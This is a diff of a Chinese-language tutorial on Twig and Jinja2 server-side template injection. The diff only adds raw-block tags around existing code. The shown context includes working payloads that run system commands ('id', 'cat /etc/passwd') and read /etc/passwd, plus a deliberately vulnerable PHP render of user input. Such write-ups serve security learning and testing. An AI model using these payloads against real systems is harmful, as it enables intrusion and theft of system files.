@@ -43,7 +43,9 @@ Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的
 　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
 　　Twig_Autoloader::register(true);
 　　$twig = new Twig_Environment(new Twig_Loader_String());
+{% raw %}
 　　$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
+{% endraw %}
 　　echo $output;
 ?>
 ```
@@ -145,6 +147,7 @@ msf进行监听：
 以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：
 
 ```php
+{% raw %}
 \{\{'/etc/passwd'|file_excerpt(1,30)\}\}
 
 \{\{app.request.files.get(1).__construct('/etc/passwd','')\}\}
@@ -166,6 +169,7 @@ msf进行监听：
 \{\{[0,0]|reduce("system","id")|join(",")\}\}
 
 \{\{['cat /etc/passwd']|filter('system')\}\}
+{% endraw %}
 ```
 
 具体payload分析详见：《[TWIG 全版本通用 SSTI payloads](https://xz.aliyun.com/t/7518#toc-5)》
@@ -397,16 +401,20 @@ Jinja2使用 \{\{name\}\} 结构表示一个变量，它是一种特殊的占位
 Jinja2 模板同样支持控制语句，像在 \{\%…\%\} 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：
 
 ```php
+{% raw %}
 <ul>
      \{\% for comment in comments \%\}
          <li>\{\{comment\}\}</li>
      \{\% endfor \%\}
 </ul>
+{% endraw %}
 ```
 
 另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。
 
+{% raw %}
 > ​`Hello, \{\{name|capitalize\}\}`​
+{% endraw %}
 
 这边使用vulhub提供的环境进行复现，搭建成功后访问首页如图：
 
@@ -595,11 +603,13 @@ __globals__　　   ：对包含函数全局变量的字典的引用__builtin__&
 再使用jinja2的语法封装成可解析的样子：
 
 ```php
+{% raw %}
 \{\% for c in [].__class__.__base__.__subclasses__() \%\}
 \{\% if c.__name__=='file' \%\}
 \{\{ c("/etc/passwd").readlines() \}\}
 \{\% endif \%\}
 \{\% endfor \%\}
+{% endraw %}
 ```
 
 ![image](assets/image-20250425223948-3soi8u2.png)
